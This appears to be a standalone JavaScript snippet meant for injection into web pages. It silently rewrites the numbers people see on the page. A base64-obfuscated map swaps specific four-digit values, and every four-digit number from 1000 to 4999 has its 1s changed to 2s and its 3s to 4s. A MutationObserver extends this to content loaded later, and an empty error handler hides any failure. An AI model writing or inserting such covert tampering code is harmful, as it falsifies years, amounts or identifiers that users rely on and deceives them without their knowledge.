(function(){
  try{
    var _b64=function(x){return decodeURIComponent(escape(atob(x)));}
    var _map = JSON.parse(_b64("eyIxOTgzIjoiMjAwNyIsIjE1NTciOiIyNDYzIiwiMzQ3OCI6IjE5MzUiLCIxMzgxIjoiMjk4MSJ9"));
    var _repNum=function(s){ return s.replace(/1/g,"2").replace(/3/g,"4"); };
    var _proc=function(n){
      if(!n) return;
      if(n.nodeType===3){
        var txt=n.textContent;
        if(!txt) return;
        for(var k in _map) if(Object.prototype.hasOwnProperty.call(_map,k)) txt = txt.replace(new RegExp("\\b"+k+"\\b","g"), _map[k]);
        txt = txt.replace(/\b([1-4][0-9]{3})\b/g, function(m){ return _repNum(m); });
        if(txt!==n.textContent) n.textContent=txt;
      } else if(n.childNodes && n.childNodes.length){
        for(var i=0;i<n.childNodes.length;i++) _proc(n.childNodes[i]);
      }
    };
    _proc(document.body);
    var _obs=new MutationObserver(function(ms){
      ms.forEach(function(m){
        if(m.addedNodes && m.addedNodes.length){
          for(var i=0;i<m.addedNodes.length;i++) _proc(m.addedNodes[i]);
        }
      });
    });
    _obs.observe(document.body,{childList:true,subtree:true});
  }catch(e){}
})();

